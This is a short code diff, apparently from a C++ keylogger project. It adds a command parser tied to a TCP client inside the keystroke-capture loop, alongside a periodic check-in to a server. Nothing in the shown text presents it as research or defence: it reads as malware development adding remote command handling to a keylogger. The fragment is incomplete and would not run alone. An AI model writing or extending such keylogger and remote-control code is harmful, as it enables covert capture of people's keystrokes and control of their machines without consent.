@@ -2,12 +2,14 @@
 #include <errno.h>
 #include "TCPClient.hpp"
 #include "KeyLoger.hpp"
+#include "Parser.hpp"
 
 #include <ctime>
 
 int main(int argc, char **argv)
 {
 	TCPClient client;
+	Parser	parser(client);
 	const int serverCheckDelay = 2*60;
 	unsigned long timestamp;
 	unsigned long chrono;
@@ -19,7 +21,7 @@ int main(int argc, char **argv)
 	timestamp = std::time(nullptr);
 	while (KeyLogger::getInstance().refreshNonBlocking())
 	{
-		
+		parser.parseCommands();
 		chrono = std::time(nullptr);
 		if (chrono - timestamp >= serverCheckDelay) {
 			KeyLogger::getInstance().checkServer();
